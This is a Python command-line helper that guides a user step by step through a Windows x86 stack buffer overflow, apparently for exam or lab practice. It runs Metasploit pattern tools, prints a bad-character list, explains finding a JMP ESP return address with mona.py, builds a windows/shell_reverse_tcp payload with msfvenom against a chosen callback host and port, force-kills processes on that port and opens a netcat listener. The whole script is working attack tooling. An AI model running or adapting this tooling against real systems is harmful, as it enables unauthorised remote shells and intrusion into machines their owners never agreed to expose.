import argparse
import subprocess
import sys
import textwrap
import socket
from colorama import Fore, Style


def bof():
    print(textwrap.dedent(
        '''
         Steps to Conduct Buffer Overflow
    
            1.   Fuzzing
            2.   Finding the Offset
            3.   Overwriting the EIP
            4.   Finding Bad Characters
            5.   Finding the Right Module
            6.   Generating Shellcode
            7.   Root! 
        '''
    ))


def finding_the_right_module():
    print(Fore.CYAN + Style.BRIGHT + textwrap.dedent(
        '''
        [5] Find the right module
        
        [5.a]  Look for a DLL that has no memory protections using mona.py
                > Command: !mona modules
                
        [5.b]  Look for something attached to program we are attacking that shows false for the following memory protections:
                > Rebase | SafeSEH | ASLR  | NXCompat | 
                
        [5.c]  Find the instruction "JMP ESP" in module: 
                > Command: !mona find -s "\\xff\\xe4" -m <module .dll>
                
        [5.d]  Copy the return address and modify python script with return address in little endian (reverse order) 
               •  Example of reverse order:
                 ◇ original address: 625011AF
                    ▪ reverse order: \\xaf\\x11\\x50\\x62
                    
                Payload should now look something like this:
                    > payload = ‘A' * <offset> + ‘<address>’
        '''
    ) + Style.RESET_ALL)

    validation()


def validation():
    while True:
        response = input(
            Fore.BLUE + Style.BRIGHT + "Have you completed these steps?? Enter 'y' or 'n':" + Style.RESET_ALL)

        if (response.lower() == "y" or response.lower() == "yes") and (response.isalpha()):
            break
        else:
            print(Fore.RED + Style.BRIGHT + "[!] Something is wrong. Check your input" + Style.RESET_ALL)
            continue


def is_valid_port(port):
    if port >= 1 and port <= 65535:
        return True
    else:
        return False


def is_valid_ip(ip):
    try:
        if socket.gethostbyname(ip) == ip:
            return True
        else:
            return False
    except socket.gaierror:
        print(Fore.RED + Style.BRIGHT + f'[!] Invalid format {ip}' + Style.RESET_ALL)


def get_unique_bytes():
    while True:
        unique_bytes = input(Fore.BLUE + Style.BRIGHT + "[+] Paste unique bytes found in EIP:" + Style.RESET_ALL)
        if unique_bytes.isdigit():
            return str(unique_bytes)
        else:
            print(Fore.RED + Style.BRIGHT + "[!] Input must be an integer" + Style.RESET_ALL)
            continue


def finding_offset():
    print(Fore.CYAN + Style.BRIGHT + "[2] Finding the offset" + Style.RESET_ALL)
    pattern_create_unique_bytes = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"
    pattern_offset = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb"
    switch_byte_length = "-l"
    switch_unique_bytes = "-q"

    byte_count = get_byte_count()

    generate_unique_bytes(pattern_create_unique_bytes, switch_byte_length, byte_count)

    unique_bytes = get_unique_bytes()

    find_offset(pattern_offset, switch_byte_length, byte_count, switch_unique_bytes, unique_bytes)


def get_byte_count():
    while True:
        byte_count = input(Fore.BLUE + Style.BRIGHT + "[+] Paste byte count:" + Style.RESET_ALL)
        if byte_count.isdigit():
            print("\n")
            return str(byte_count)
        else:
            print(Fore.RED + Style.BRIGHT + "[!] Input must be an integer" + Style.RESET_ALL)
            continue


def generate_unique_bytes(pattern_create_unique_bytes, switch_byte_length, byte_count):
    print("unique_bytes=('''")
    subprocess.call([pattern_create_unique_bytes, switch_byte_length, byte_count])
    print("'''", end="" + ")" + "\n\n")


def find_offset(pattern_offset, switch_byte_length, byte_count, switch_unique_bytes, unique_bytes):
    print("\n")
    subprocess.call([pattern_offset, switch_byte_length, byte_count, switch_unique_bytes, unique_bytes])


def bad_characters():
    counter = 0
    print("\n[+] Bad Characters 1-255\n")
    print("badchars=(")
    for chars in range(1, 256):
        if counter == 0:
            print('"', end="")
        elif counter % 16 == 0:
            print('"', end="")
        sys.stdout.write("\\x" + '{:02x}'.format(chars))
        if chars % 16 == 0:
            print('"')
        counter = counter + 1

    print('"', end="" + ")" + "\n\n")

    print(Fore.CYAN + Style.BRIGHT + textwrap.dedent(
        '''
           [4] Find bad characters
               
               [4.a] Send all possible 255 characters in hex and look for abnormal characters
                     updated code may look something like this: 
                      
                      > shellcode = 'A' * <offset> + 'B' * 4 + badchars
        '''
    ) + Style.RESET_ALL)

    validation()


def generate_payload():
    local_host_ip, local_host_port, bad_chars = get_payload_dependencies()

    msfvenom = "msfvenom"
    switch_payload = "-p"
    payload = "windows/shell_reverse_tcp"
    lhost = f"LHOST={local_host_ip}"
    lport_msf = f"LPORT={local_host_port}"
    no_crash = "EXITFUNC=thread"
    switch_format = "-f"
    format = "c"
    switch_architecture = "-a"
    architecture = "x86"
    switch_badchars = "-b"

    subprocess.call(
        [msfvenom, switch_payload, payload, lhost, lport_msf, no_crash, switch_format, format, switch_architecture,
         architecture, switch_badchars, bad_chars])

    kill_port(local_host_port)  # Kill all processes listening on local port of choice
    nc_listener(local_host_port)  # Start netcat listener


def get_payload_dependencies():
    print(Fore.CYAN + Style.BRIGHT + textwrap.dedent(
        '''
        [6] Generate shell code
            
            [6.a] payload = ‘A' * <offset bytes> + ‘<address>’ + <nops> * <some number> + shellcode
        '''
    ) + Style.RESET_ALL)

    reverse_address()

    while True:
        local_host_ip = input(Fore.BLUE + Style.BRIGHT + "[*] Enter LHOST (ip of your machine):" + Style.RESET_ALL)
        if not is_valid_ip(local_host_ip):
            continue
        else:
            break

    while True:
        local_host_port = input(
            Fore.BLUE + Style.BRIGHT + "[*] Enter LPORT (port you want reverse to call back to):" + Style.RESET_ALL)
        if not local_host_port.isdigit():
            print("\n" + Fore.RED + Style.BRIGHT + "[!] Enter valid port" + Style.RESET_ALL)
            continue
        if not is_valid_port(int(local_host_port)):
            print("\n" + Fore.RED + Style.BRIGHT + "[!] Enter valid port" + Style.RESET_ALL)
            continue
        else:
            break

    bad_chars = input(Fore.BLUE + Style.BRIGHT + "[*] Enter badcharacters found in step 4:" + Style.RESET_ALL)

    return local_host_ip, local_host_port, bad_chars


def kill_port(lport):
    subprocess.run("touch pid.txt", shell=True)
    subprocess.run(f"lsof -i :{lport}" + " | awk 'NR=2 { print$2 }' | grep -v 'PID' > pid.txt", shell=True)
    subprocess.run("while read line; do kill -9 $line; done < pid.txt | rm pid.txt", shell=True)


def nc_listener(lport):
    print(f"\nNecat listener listening on local port {lport}")
    subprocess.run(f"nc -nlvp {lport}", shell=True)


def reverse_address():
    address = get_address()
    address = bytearray.fromhex(address)
    address.reverse()
    address = ''.join(format(x, '02x') for x in address)
    reversed_address = '\\x'.join([address[i:i + 2] for i in range(0, len(address), 2)])
    reversed_address = reversed_address.lower()
    print(Fore.BLUE + Style.BRIGHT + "\nAddress in little endian: " + Style.RESET_ALL, end='')
    print(Fore.GREEN + Style.BRIGHT + '\\x' + reversed_address + Style.RESET_ALL + "\n")


def get_address():
    while True:
        address = input(Fore.BLUE + Style.BRIGHT + "[*] Enter address Example: 625011AF:" + Style.RESET_ALL)
        if address.isalnum() and len(address) / 2 == 4:
            return address
        else:
            print(Fore.RED + Style.BRIGHT + "[!] Somethings wrong.  Check your input" + Style.RESET_ALL)


def cmd_options():
    parser = argparse.ArgumentParser(description="Simple application for step by step buffer overflow",
                                     usage=''' python3 buffer_overflow -s <step number> [options]

        Example: 

            python3 buffer_overflow -s 2 --a''',
                                     formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument('-s',
                        '--step',
                        type=str,
                        required=True,
                        help='''
     Select which step in the buffer overflow process you'd like to begin
                            
     For example, if you're given the byte count and therefore do not need to fuzz
     begin at step 2:
                            
     Example Usage: python3 buffer_overflow -s 2
     ''')
    parser.add_argument('-a',
                        '--automated',
                        type=str,
                        default=None,
                        required=False,
                        help="The automated option '-a'completes the majority of BOF process for you")
    parser.add_argument('-cp',
                        '--copy_paste',
                        type=str,
                        default=None,
                        required=False,
                        help=
                        '''
    The copy paste option '-cp' will take you through the BOF 
    process step by step; However, commands will need to be copy 
    and pasted in another terminal
                                    
    Example Usage: python3 buffer_overflow -s 2 -cp
    ''')

    args = parser.parse_args()

    is_valid_arguments(args.step)

    return args.step, args.automated, args.copy_paste


def is_valid_arguments(step):
    if step.isdigit and len(step) == 1:
        pass
    else:
        print(Fore.RED + Style.BRIGHT + "[!] Input must be a single positive integer" + Style.RESET_ALL)
        sys.exit()


def overwrite_the_eip():
    print(Fore.CYAN + Style.BRIGHT + textwrap.dedent(
        '''
        [3] Overwrite the EIP
            
            [3.a] Once we have the offset send ‘A’s the same size as offset, then four ‘B’s to make sure
                  we have control of EIP example: 
                   
                    > shell_code = 'A' * <offset> + 'B' * 4
           
           [3.b] The EIP should be overwritten with ‘42424242’ (if not redo step 2)
        '''
    ) + Style.RESET_ALL)

    while True:
        response = input(
            Fore.BLUE + Style.BRIGHT + "Is the 'EIP' overwritten with ‘42424242’? Enter 'y' or 'n':" + Style.RESET_ALL)

        if (response.lower() == "y" or response.lower() == "yes") and (response.isalpha()):
            break
        elif (response.lower() == "n" or response.lower() == "no") and (response.isalpha()):
            print(Fore.GREEN + Style.BRIGHT + "Redoing doing offset module" + Style.RESET_ALL)
            finding_offset()
            continue
        else:
            print(Fore.RED + Style.BRIGHT + "[!] Something is wrong. Check your input" + Style.RESET_ALL)
            continue


def main():
    cmd_options()

    bof()

    finding_offset()

    overwrite_the_eip()

    bad_characters()

    finding_the_right_module()

    generate_payload()


if __name__ == '__main__':
    main()
